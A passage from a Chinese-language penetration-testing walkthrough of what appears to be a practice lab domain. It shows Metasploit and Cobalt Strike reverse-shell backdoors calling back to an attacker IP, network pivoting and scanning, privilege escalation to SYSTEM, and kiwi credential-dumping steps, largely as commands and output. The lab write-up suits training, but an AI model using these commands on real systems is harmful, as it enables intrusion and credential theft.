</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h4 id="加个壳"><a href="#加个壳" class="header-anchor">#</a> 加个壳</h4> <p><img src="/assets/img/image-20220811181014648.75b9aec6.png" alt="image-20220811181014648"></p> <h4 id="上传后门"><a href="#上传后门" class="header-anchor">#</a> 上传后门</h4> <p>加壳版和普通版都传，以防万一</p> <p><img src="/assets/img/image-20220811181159361.61cf7914.png" alt="image-20220811181159361"></p> <p><img src="/assets/img/image-20220811182111039.64fda8fd.png" alt="image-20220811182111039"></p> <h4 id="监听"><a href="#监听" class="header-anchor">#</a> 监听</h4> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>msf6 <span class="token operator">&gt;</span> use exploit/multi/handler
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcp
msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options

Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options <span class="token punctuation">(</span>generic/shell_reverse_tcp<span class="token punctuation">)</span>:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specifi
                                     ed<span class="token punctuation">)</span>
   LPORT  <span class="token number">4444</span>             <span class="token function">yes</span>       The listen port


Exploit target:

   Id  Name
   --  ----
   <span class="token number">0</span>   Wildcard Target


msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp
payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/x64/meterpreter/reverse_tcp                                                                                       
msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.220.137
lhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.220.137                                                                                                             
msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lport <span class="token number">9999</span>
lport <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">9999</span>                                                                                                                        
msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 
                                                                                                                                     
Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:                                                                                              
                                                                                                                                     
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options <span class="token punctuation">(</span>windows/x64/meterpreter/reverse_tcp<span class="token punctuation">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>
   LHOST     <span class="token number">192.168</span>.220.137  <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
   LPORT     <span class="token number">9999</span>             <span class="token function">yes</span>       The listen port


Exploit target:

   Id  Name
   --  ----
   <span class="token number">0</span>   Wildcard Target


msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.220.137:9999 

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br></div></div><p>到蚁剑中运行</p> <p><img src="/assets/img/image-20220811184743952.8be00f33.png" alt="image-20220811184743952"></p> <p>Kali监听响应：</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.220.137:9999 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">200262</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.220.138
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">2</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.220.137:9999 -<span class="token operator">&gt;</span> <span class="token number">192.168</span>.220.138:1237 <span class="token punctuation">)</span> at <span class="token number">2022</span>-08-11 06:45:39 -0400

meterpreter <span class="token operator">&gt;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>收集补丁信息</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>meterpreter &gt; run post/windows/gather/enum_patches

[*] Patch list saved to /root/.msf4/loot/20220811064922_default_192.168.220.138_enum_patches_752941.txt
[+] KB2534111 installed on 8/25/2019
[+] KB2999226 installed on 9/15/2019
[+] KB958488 installed on 8/29/2019
[+] KB976902 installed on 11/21/2010
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>收集主机内软件安装信息</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>meterpreter &gt; run post/windows/gather/enum_applications

[*] Enumerating applications installed on STU1

Installed Applications
======================

 Name                                                                Version
 ----                                                                -------
 Everything 1.4.1.877 (x64)                                          1.4.1.877 (x64)
 Microsoft .NET Framework 4 Client Profile                           4.0.30319
 Microsoft .NET Framework 4 Client Profile                           4.0.30319
 Microsoft .NET Framework 4 Extended                                 4.0.30319
 Microsoft .NET Framework 4 Extended                                 4.0.30319
 Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161      9.0.30729.6161
 Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148      9.0.30729.4148
 Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161      9.0.30729.6161
 Microsoft Visual C++ 2013 Redistributable (x86) - 12.0.21005        12.0.21005.1
 Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.21005       12.0.21005
 Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.21005          12.0.21005
 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2019 X64 Additional Runtime - 14.20.27508      14.20.27508
 Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.20.27508         14.20.27508
 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
 Mozilla Firefox 69.0.1 (x86 zh-CN)                                  69.0.1
 Mozilla Maintenance Service                                         68.0.2
 Nmap 7.80                                                           7.80
 Notepad++ (32-bit x86)                                              7.7.1
 Npcap 0.9983                                                        0.9983
 OpenVPN 2.4.7-I603                                                  2.4.7-I603
 Python 2.7 (64-bit)                                                 2.7.150
 TAP-Windows 9.21.2                                                  9.21.2
 VMware Tools                                                        11.0.6.15940789
 WinPcap 4.1.3                                                       4.1.0.2980
 WinRAR 5.71 (64-位)                                                  5.71.0
 Wireshark 3.0.4 32-bit                                              3.0.4


[+] Results stored in: /root/.msf4/loot/20220811064952_default_192.168.220.138_host.application_850045.txt
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br></div></div><blockquote><p>发现nmap，可以直接利用，对其内网进行扫描</p> <p>但是在实际环境当中，目标计算机一般不会自带nmap，所以模拟真实的环境，先把流量代理出来，利用攻击机自身的工具，去对内网进行一个扫描</p></blockquote> <h2 id="内网渗透"><a href="#内网渗透" class="header-anchor">#</a> 内网渗透</h2> <p>添加路由</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>meterpreter &gt; run autoroute -s 192.168.52.0 255.255.255.0

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.168.52.0/255.255.255.0...
[+] Added route to 192.168.52.0/255.255.255.0 via 192.168.220.138
[*] Use the -p option to list all active routes
meterpreter &gt; run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.52.0       255.255.255.0      Session 2

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h3 id="arp扫内网主机"><a href="#arp扫内网主机" class="header-anchor">#</a> ARP扫内网主机</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>meterpreter &gt; run post/windows/gather/arp_scanner rhosts=192.168.52.0/24

[*] Running module against STU1
[*] ARP Scanning 192.168.52.0/24
[+]     IP: 192.168.52.138 MAC 00:0c:29:c1:33:d6 (VMware, Inc.)
[+]     IP: 192.168.52.143 MAC 00:0c:29:bd:35:01 (VMware, Inc.)
[+]     IP: 192.168.52.141 MAC 00:0c:29:1c:44:8e (VMware, Inc.)
[+]     IP: 192.168.52.255 MAC 00:0c:29:bd:35:01 (VMware, Inc.)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>暂时将handler隐藏到后台</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>meterpreter &gt; background 
[*] Backgrounding session 2...
msf6 exploit(multi/handler) &gt; back
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h3 id="判断域控"><a href="#判断域控" class="header-anchor">#</a> 判断域控</h3> <p>法一：上传nbtscan，扫子网</p> <p><img src="/assets/img/image-20220811204915927.d5cc6974.png" alt="image-20220811204915927"></p> <p>法二：nmap扫描出的主机端口开放情况判断，192.168.52.138这台主机开启了464端口和389端口</p> <p><img src="/assets/img/image-20220811210453367.b45e60f6.png" alt="image-20220811210453367"></p> <h3 id="msf起代理-nmap失败"><a href="#msf起代理-nmap失败" class="header-anchor">#</a> msf起代理 (nmap失败)</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>msf6 &gt; use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) &gt; show options 

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The address to listen on
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


msf6 auxiliary(server/socks_proxy) &gt; set srvhost 127.0.0.1
srvhost =&gt; 127.0.0.1
msf6 auxiliary(server/socks_proxy) &gt; run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><p>nmap扫不出来，凉了</p> <p><img src="/assets/img/image-20220811234420908.9d2c585f.png" alt="image-20220811234420908"></p> <p><img src="/assets/img/image-20220811233638539.439ab18f.png" alt="image-20220811233638539"></p> <p>不过，蚁剑拿到了shell，回到蚁剑用Win7的nmap来扫就行</p> <p><img src="/assets/img/image-20220811233803703.80299e6c.png" alt="image-20220811233803703"></p> <p>通过端口情况可以发现两台服务器的135 139 445开放，其均为永恒之蓝 MS17-010 的漏洞特征，因此我们可以尝试使用metasploit进行MS17-010的攻击。</p> <h2 id="权限提升"><a href="#权限提升" class="header-anchor">#</a> 权限提升</h2> <h3 id="法一-msf"><a href="#法一-msf" class="header-anchor">#</a> 法一：MSF</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>meterpreter &gt; getuid
Server username: GOD\Administrator
meterpreter &gt; getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h3 id="法二-使用cs模块-含渗透"><a href="#法二-使用cs模块-含渗透" class="header-anchor">#</a> 法二：使用CS模块 (含渗透)</h3> <p>先将CS服务端开起来</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Desktop/csrun<span class="token punctuation">]</span>
└─<span class="token comment"># ./teamserver  </span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Generating X509 certificate and keystore <span class="token punctuation">(</span>for SSL<span class="token punctuation">)</span>
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span class="token operator">=</span>on -Dswing.aatext<span class="token operator">=</span>true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span class="token operator">=</span>on -Dswing.aatext<span class="token operator">=</span>true
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ./teamserver <span class="token operator">&lt;</span>host<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>password<span class="token operator">&gt;</span> <span class="token punctuation">[</span>/path/to/c2.profile<span class="token punctuation">]</span> <span class="token punctuation">[</span>YYYY-MM-DD<span class="token punctuation">]</span>

        <span class="token operator">&lt;</span>host<span class="token operator">&gt;</span> is the <span class="token punctuation">(</span>default<span class="token punctuation">)</span> IP address of this Cobalt Strike team server
        <span class="token operator">&lt;</span>password<span class="token operator">&gt;</span> is the shared password to connect to this server
        <span class="token punctuation">[</span>/path/to/c2.profile<span class="token punctuation">]</span> is your Malleable C2 profile
        <span class="token punctuation">[</span>YYYY-MM-DD<span class="token punctuation">]</span> is a <span class="token function">kill</span> <span class="token function">date</span> <span class="token keyword">for</span> Beacon payloads run from this server

                                                                                     
┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Desktop/csrun<span class="token punctuation">]</span>
└─<span class="token comment"># ./teamserver 192.168.220.137 123456</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Will use existing X509 certificate and keystore <span class="token punctuation">(</span>for SSL<span class="token punctuation">)</span>
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span class="token operator">=</span>on -Dswing.aatext<span class="token operator">=</span>true
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Team server is up on <span class="token number">0.0</span>.0.0:50050
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> SHA256 <span class="token builtin class-name">hash</span> of SSL cert is: b72145ea2b81b84481d743de0a082e74bd6a942fd5ba06cc35cc35dc8804b90d

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>然后打开CS</p> <p><img src="/assets/img/image-20220812193821408.38efacbe.png" alt="image-20220812193821408"></p> <p><img src="/assets/img/image-20220812193829530.3884b78a.png" alt="image-20220812193829530"></p> <p>创建监听器</p> <blockquote><p>两个IP都填kali的IP就行</p></blockquote> <p><img src="/assets/img/image-20220813012832949.56ef32b8.png" alt="image-20220813012832949"></p> <p>生成后门</p> <p><img src="/assets/img/image-20220812203942962.e7c715ad.png" alt="image-20220812203942962"></p> <p>选择刚才创建的监听器</p> <blockquote><p>本处图片仅供参考</p></blockquote> <p><img src="/assets/img/image-20220812204000037.fe3c50ef.png" alt="image-20220812204000037"></p> <p>生成x64并保存</p> <p><img src="/assets/img/image-20220812204213769.4ecc86ea.png" alt="image-20220812204213769"></p> <p>用蚁剑上传文件，并在蚁剑中的shell将后门运行起来，kali的CS就会有反应</p> <p><img src="/assets/img/image-20220813013038873.7f87a0cc.png" alt="image-20220813013038873"></p> <p><strong>开始提权：</strong></p> <blockquote><p><strong>exe提权</strong></p> <p>upload													# 加载exe文件
shell 文件名 shell &quot;whoami&quot;								# 提权并执行命令</p></blockquote> <blockquote><p><strong>提权文件参考</strong></p> <p>https://github.com/k8gege/K8tools/</p> <p>https://github.com/SecWiki/windows-kernel-exploits/</p> <p>https://github.com/rsmudge/ElevateKit</p></blockquote> <p>导入ElevateKit插件</p> <p><img src="/assets/img/image-20220813013434738.0f7caf64.png" alt="image-20220813013434738"></p> <p>开多一个监听器</p> <p><img src="/assets/img/image-20220813013826709.5e80803b.png" alt="image-20220813013826709"></p> <p>提权</p> <p><img src="/assets/img/image-20220813013626626.b8d8e649.png" alt="image-20220813013626626"></p> <p><img src="/assets/img/image-20220813014237238.ff1643e1.png" alt="image-20220813014237238"></p> <p>提权成功</p> <p><img src="/assets/img/image-20220813014501295.6242ff88.png" alt="image-20220813014501295"></p> <h2 id="远程登陆"><a href="#远程登陆" class="header-anchor">#</a> 远程登陆</h2> <h3 id="获取密码"><a href="#获取密码" class="header-anchor">#</a> 获取密码</h3> <h4 id="法一-msf-2"><a href="#法一-msf-2" class="header-anchor">#</a> 法一：MSF</h4> <blockquote><p>ps 					# 查看 lsm.exe 进程的 PID</p> <p>migrate 512	<em># 默认是加载32位的系统，所以如果目标主机是64位系统的话,需要将进程迁移到一个64位程序的进程中</em></p> <p>load kiwi		<em># 加载kiwi模块</em></p> <p>creds_all		<em># 列举系统中的明文密码</em></p></blockquote> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>meterpreter <span class="token operator">&gt;</span> <span class="token function">ps</span>

Process List
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

 PID   <span class="token environment constant">PPID</span>  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 <span class="token number">0</span>     <span class="token number">0</span>     <span class="token punctuation">[</span>System Process<span class="token punctuation">]</span>
 <span class="token number">4</span>     <span class="token number">0</span>     System             x64   <span class="token number">0</span>
 <span class="token number">244</span>   <span class="token number">4</span>     smss.exe           x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           <span class="token punctuation">\</span>SystemRoot<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>smss.exe
 <span class="token number">348</span>   <span class="token number">328</span>   csrss.exe          x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>csrss.exe
 <span class="token number">396</span>   <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>NETWORK SERVICE  C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>svchost.exe
 <span class="token number">404</span>   <span class="token number">396</span>   csrss.exe          x64   <span class="token number">1</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>csrss.exe
 <span class="token number">412</span>   <span class="token number">328</span>   wininit.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>wininit.exe
 <span class="token number">448</span>   <span class="token number">396</span>   winlogon.exe       x64   <span class="token number">1</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>winlogon.exe
 <span class="token number">508</span>   <span class="token number">412</span>   services.exe       x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>services.exe
 <span class="token number">516</span>   <span class="token number">412</span>   lsass.exe          x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>lsass.exe
 <span class="token number">524</span>   <span class="token number">412</span>   lsm.exe            x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>lsm.exe
 <span class="token number">612</span>   <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>svchost.exe
 <span class="token number">692</span>   <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>NETWORK SERVICE  C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>svchost.exe
 <span class="token number">792</span>   <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>LOCAL SERVICE    C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>svchost.exe
 <span class="token number">832</span>   <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>svchost.exe
 <span class="token number">860</span>   <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>svchost.exe
 <span class="token number">984</span>   <span class="token number">832</span>   dwm.exe            x64   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>Dwm.exe
 <span class="token number">992</span>   <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>LOCAL SERVICE    C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>svchost.exe
 <span class="token number">1140</span>  <span class="token number">508</span>   spoolsv.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>spoolsv.exe
 <span class="token number">1184</span>  <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>LOCAL SERVICE    C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>svchost.exe
 <span class="token number">1212</span>  <span class="token number">1516</span>  explorer.exe       x64   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Explorer.EXE
 <span class="token number">1328</span>  <span class="token number">1212</span>  vm3dservice.exe    x64   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>vm3dservice.exe
 <span class="token number">1388</span>  <span class="token number">508</span>   openvpnserv.exe    x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>OpenVPN<span class="token punctuation">\</span>bin<span class="token punctuation">\</span>openvpnserv.exe
 <span class="token number">1440</span>  <span class="token number">2116</span>  mysqld.exe         x86   <span class="token number">1</span>        GOD<span class="token punctuation">\</span>Administrator             C:<span class="token punctuation">\</span>phpStudy<span class="token punctuation">\</span>MySQL<span class="token punctuation">\</span>bin<span class="token punctuation">\</span>mysqld.exe
 <span class="token number">1460</span>  <span class="token number">508</span>   VGAuthService.exe  x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>VMware<span class="token punctuation">\</span>VMware Tools<span class="token punctuation">\</span>VMware VGAuth<span class="token punctuation">\</span>VG
                                                                             AuthService.exe
 <span class="token number">1544</span>  <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>svchost.exe
 <span class="token number">1576</span>  <span class="token number">508</span>   vmtoolsd.exe       x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM           C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>VMware<span class="token punctuation">\</span>VMware Tools<span class="token punctuation">\</span>vmtoolsd.exe
